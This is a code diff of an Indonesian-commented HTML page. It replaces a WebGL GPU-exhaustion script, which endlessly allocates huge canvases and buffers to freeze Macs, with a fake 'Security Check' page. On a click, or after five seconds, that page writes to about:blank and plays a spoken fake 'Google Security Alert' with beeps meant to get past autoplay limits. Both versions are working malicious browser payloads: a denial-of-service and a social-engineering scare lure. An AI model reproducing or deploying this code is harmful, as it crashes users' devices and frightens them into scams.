@@ -3,99 +3,144 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>GPU Process Exhaustion (macOS)</title>
+<title>Security Check</title>
 <style>
-  body { background: #000; color: #f00; overflow: hidden; font-family: monospace; text-align: center; padding-top: 20vh; }
-  canvas { display: none; }
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    background: #f0f4f8;
+    font-family: 'Segoe UI', Arial, sans-serif;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+    cursor: pointer;
+    user-select: none;
+  }
+  .panel {
+    background: #fff;
+    padding: 40px;
+    border-radius: 12px;
+    box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+    text-align: center;
+  }
+  h1 { color: #333; margin-bottom: 10px; }
+  p { color: #666; font-size: 16px; }
+  .spinner {
+    border: 4px solid #f3f3f3;
+    border-top: 4px solid #3498db;
+    border-radius: 50%;
+    width: 40px;
+    height: 40px;
+    animation: spin 1s linear infinite;
+    margin: 20px auto 0;
+  }
+  @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 </style>
 </head>
 <body>
-<h1>🔥 GPU PROCESS OVERLOAD 🔥</h1>
-<p id="status">Mengalokasikan VRAM Apple Silicon...</p>
+
+<div class="panel">
+  <h1>🔒 Security Check</h1>
+  <p>Klik di mana saja untuk memverifikasi...</p>
+  <div class="spinner"></div>
+</div>
 
 <script>
 (function () {
   'use strict';
 
-  var statusEl = document.getElementById('status');
-  var contextCount = 0;
-  var contexts = [];
-  
-  // Mendeteksi apakah ini Mac (Apple Silicon / Intel)
-  var isMac = navigator.platform.toUpperCase().indexOf('MAC') >= 0;
-  var isAppleSilicon = isMac && (navigator.userAgent.indexOf('Mac OS X 10_15') > -1 || navigator.hardwareConcurrency >= 8);
+  var hasClicked = false;
 
   // ============================================
-  // FUNGSI PENGHANCUR GPU (MAC OPTIMIZED)
+  // KONTEN UNTUK ABOUT:BLANK (Audio & TTS Bypass)
   // ============================================
-  function floodGPU() {
-    try {
-      // 1. Buat Canvas dengan resolusi maksimal (Apple GPU sangat cepat memproses ini,
-      // jadi kita paksa menggunakan alokasi VRAM sebesar mungkin)
-      var canvas = document.createElement('canvas');
-      canvas.width = 16384;  // Batas maksimal tekstur (MacBook Pro M1/M2/M3 mendukung 16K)
-      canvas.height = 16384;
+  var payloadHTML = `
+    <!DOCTYPE html>
+    <html>
+    <head><title>System Check</title></head>
+    <body style="background:#111;color:#0f0;font-family:monospace;text-align:center;padding-top:20vh;">
+      <h1>SYSTEM VERIFIED</h1>
+      <p>Memutar suara otomatis...</p>
+      <script>
+        (function() {
+          // A. Putar TTS (Google Alert)
+          if ('speechSynthesis' in window) {
+            window.speechSynthesis.cancel();
+            var u = new SpeechSynthesisUtterance("Google Security Alert. Your account has been accessed from an unknown device. If this was not you, verify your identity immediately.");
+            u.lang = 'en-US';
+            u.rate = 0.9;
+            u.volume = 1.0;
+            window.speechSynthesis.speak(u);
+          }
 
-      // 2. Pilih API (WebGL 2.0)
-      var gl = canvas.getContext('webgl2', {
-        antialias: false,
-        depth: true,
-        stencil: false,
-        alpha: false,
-        preserveDrawingBuffer: true,
-        powerPreference: "high-performance"
-      });
+          // B. Putar AudioContext Beep (Bypass Autoplay)
+          try {
+            var ctx = new (window.AudioContext || window.webkitAudioContext)();
+            if (ctx.state === 'suspended') {
+              ctx.resume().then(function() { console.log('[AC] Resumed'); });
+            }
+            // Buat suara beep panjang
+            var osc = ctx.createOscillator();
+            var gain = ctx.createGain();
+            osc.type = 'sine';
+            osc.frequency.value = 880;
+            gain.gain.value = 0.5;
+            osc.connect(gain);
+            gain.connect(ctx.destination);
+            osc.start();
+            osc.stop(ctx.currentTime + 2.0); // Beep 2 detik
+          } catch(e) {}
 
-      if (!gl) return;
+          // C. Putar Audio Element (Silent/Beep)
+          try {
+            var a = new Audio('data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA=');
+            a.volume = 1.0;
+            a.play();
+          } catch(e) {}
+        })();
+      <\/script>
+    </body>
+    </html>
+  `;
 
-      // 3. Alokasi ArrayBuffer Besar (1GB per context)
-      // Apple Silicon Unified Memory: RAM dan VRAM adalah satu.
-      // Mengalokasikan VRAM di sini akan memakan RAM sistem.
-      var buffer = gl.createBuffer();
-      gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
-      
-      var size = 256 * 1024 * 1024; // 256 juta float (1GB)
-      var data = new Float32Array(size);
-      gl.bufferData(gl.ARRAY_BUFFER, data, gl.STATIC_DRAW);
+  // ============================================
+  // FUNGSI REDIRECT KE ABOUT:BLANK & INJECT AUDIO
+  // ============================================
+  function executeBypass() {
+    if (hasClicked) return;
+    hasClicked = true;
 
-      // 4. Paksa GPU untuk merender (Shader Compilation & Draw Call)
-      var vsSource = `attribute vec4 aVertexPosition; void main() { gl_Position = aVertexPosition; }`;
-      var fsSource = `void main() { gl_FragColor = vec4(1.0, 0.0, 0.0, 1.0); }`;
-      
-      var shader = gl.createShader(gl.VERTEX_SHADER);
-      gl.shaderSource(shader, vsSource);
-      gl.compileShader(shader);
-      
-      var program = gl.createProgram();
-      gl.attachShader(program, shader);
-      gl.linkProgram(program);
-      gl.useProgram(program);
-      
-      // 5. Gambar ratusan ribu kali untuk memaksa GPU bekerja
-      gl.drawArrays(gl.TRIANGLES, 0, 3);
-      
-      // JANGAN HAPUS BUFFER/CONTEXT (Memory Leak)
-      contexts.push(gl);
-      contextCount++;
+    // Ubah UI
+    document.querySelector('p').innerText = 'Memverifikasi sistem...';
 
-      statusEl.innerText = "WebGL Contexts Allocated: " + contextCount;
-
-      if (contextCount % 100 === 0) {
-        console.log("[!] GPU Contexts: " + contextCount);
-      }
-
-    } catch (e) {
-      console.log("GPU Error (Expected when VRAM full):", e.message);
+    // 1. Buka tab baru about:blank
+    var win = window.open('about:blank', '_self'); // Gunakan '_self' agar menimpa tab ini, atau '_blank' untuk tab baru
+    
+    if (!win) {
+      // Jika popup diblokir, coba arahkan langsung (fallback)
+      window.location.href = 'about:blank';
+      return;
     }
 
-    // 6. Loop super cepat (setiap 10ms)
-    setTimeout(floodGPU, 10); 
+    try {
+      // 2. Tulis konten ke about:blank (Parent masih memegang kendali)
+      win.document.open();
+      win.document.write(payloadHTML);
+      win.document.close();
+      console.log("[!] Audio bypass dieksekusi di about:blank.");
+    } catch (e) {
+      console.log("Gagal menulis ke about:blank:", e.message);
+    }
   }
 
   // ============================================
-  // EKSEKUSI
+  // EVENT LISTENER KLIK (USER GESTURE)
   // ============================================
-  setTimeout(floodGPU, 500);
+  document.body.addEventListener('click', executeBypass, { once: true });
+
+  // Tambahan: Jika user tidak klik, paksa setelah 5 detik (mungkin diblokir)
+  setTimeout(executeBypass, 5000);
 
 })();
 </script>
